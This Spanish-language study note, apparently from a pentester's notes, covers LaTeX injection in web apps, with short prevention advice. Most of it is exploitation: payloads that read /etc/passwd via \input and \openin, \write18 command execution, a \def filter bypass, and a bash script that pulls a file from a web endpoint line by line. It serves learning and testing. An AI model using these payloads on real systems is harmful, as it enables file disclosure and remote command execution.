-----
- Tags: #ataques #basico #teoria #practica
----

# ¿ Que es **LaTeX** ?

**LaTeX** es un sistema de composición de textos, orientado a la creación de documentos escritos que presenten una alta calidad tipográfica. Esta formado mayoritariamente por órdenes construidas a partir de comandos de **TeX** pero con la ventaja de **poder aumentar las capacidades** de  **LaTeX** utilizando comandos propios de **TeX** .

----

# ¿ Que son las **LaTeX Injections** ? 

Las **inyecciones LaTeX** son un tipo de ataque que se aprovecha de las vulnerabilidades en las aplicaciones web que permiten a los usuarios ingresar **texto formateado** en **LaTeX**. LaTeX es un sistema de composición de textos que se utiliza comúnmente en la escritura académica y científica.

Estos ataques ocurren cuando un atacante **ingresa código LaTeX malicioso** en un campo de entrada de texto que luego se procesa en una aplicación web. El código LaTeX puede ser diseñado para **aprovechar vulnerabilidades** en la aplicación conseguir una [[RCE - (Remote Command Execution)]]. 

Un ejemplo podría ser un atacante qeu aprovecha la capacidad de LaTeX para incluir gráficos y archivos en una aplicación web. Un atacante podría enviar un código LaTeX que incluya un enlace a un archivo malicioso, como un virus o un troyano, que podría infectar el servidor o los sistemas de la red. 

-----

#  Evitar estos ataques 

Para evitar las **inyecciones LaTeX**, las aplicaciones web deben validar y limpiar adecuadamente los datos que se reciben antes de procesarlos en LaTeX. Esto incluye la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en LaTeX.

También es importate que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitorees regularmente las actividades de la aplicación para detectar posibles inyecciones. Además, se debe fomentar la educación sobre la seguridad en el use de LaTeX y cómo evitar la introducción de código malicioso.

---

# Explotación 

En la explotación de LaTeX, existen varias inyecciónes las cuales se pueden ver ([Inyecciones de LaTeX](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection), [más inyecciones en otra página](https://salmonsec.com/cheatsheet/latex_injection)). 

## Read file 

`\input{/etc/passwd}` Esto aveces puede entrar en conflicto devido a los caracteres

Por lo que podriamos hacer uso de este input para leer archivos y haciendo uso `\immediate\write18{command}` para hacer algo como lo sig. 

`\immediate\write18{cat /etc/passwd | base64 > output}`
`\input{output}

 Otras inyecciones sirven para leer unicamente arcivos .tex:

`\include{somefile} # load .tex file (somefile.tex)`

Tambien podriamos leer línea por línea:

Para ver la primera línea de un archivo: 

`\newread\file`
`\openin\file=/etc/passwd`
`\read\file to\line`
`\text{\line}`
`\closein\file`

Para ver la segunda: 

`\newread\file`
`\openin\file=/etc/passwd`
`\read\file to\line`
`\read\file to\line`
`\text{\line}`
`\closein\file`

Y así sucesivamente para ver más lineas agregando el `\read\file to\line`

Si bien podriamos intentar leer multiples líneas de LaTeX, hay veces que por determinados carácteres no se logran visualizar, por lo que podriamos tener un error, en ese caso seria más optimo crear un script en bash para lograr esto mismo. 

Ejemplo de script:

```shell
#!/bin/bash 
 
# Global Vars 

declare -r url="http://localhost/ajax.php" # Declaramos una variable unicamente de "lecutar" para evitar ocupar mucho espacio
filename=$1

if [ $filename ]; then
	line="%0A\read\file%20to\line"
  for i in $(seq 1 100);do 

	file_to_download=$(curl -s -X POST $url -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "content=\newread\file%0A\openin\file=$filename$line%0A\text{\line}%0A\closein\file&template=blank" | /usr/bin/grep -i download | /usr/bin/awk 'NF{print $NF}')
  
	if [ $file_to_download ]; then 
	  wget $file_to_download &>/dev/null 
  
	  file_to_convert=$(echo $file_to_download | /usr/bin/tr '/' ' ' | /usr/bin/awk 'NF{print $NF}')
	  /usr/bin/pdftotext $file_to_convert 
  
	  file_to_read=$(echo $file_to_convert | /usr/bin/sed 's/\.pdf/\.txt/')
	  rm $file_to_convert 
	  /usr/bin/cat $file_to_read | /usr/bin/head -n 1
	  rm $file_to_read
	  line+="%0A\read\file%20to\line"
	else 
	  line+="%0A\read\file%20to\line"
	fi
  done 
else 
  echo -e "\n\n\t[!] Usage: $0 /etc/passwd\n\n"
fi 
```

Tambíen podriamos intentar ejecutar comandos 

`\immediate\write18{whoami}`

O ejecutar un comando y leer el output que es guardado en un archivo: 

`\immediate\write18{whoami > output}`
`\newread\file`
`\openin\file=output
`\read\file to\line`
`\read\file to\line`
`\text{\line}`
`\closein\file`

Y para burlar algunas reinstricciones se podria hacer uso de la definición de "variables": 

`\def\first{in}
`\def\second{put}`

----

`\newread\file \openin\file=/etc/passwd \read\file to\line \text{\line} \closein\file $\lstinputlisting{/etc/passwd}$`
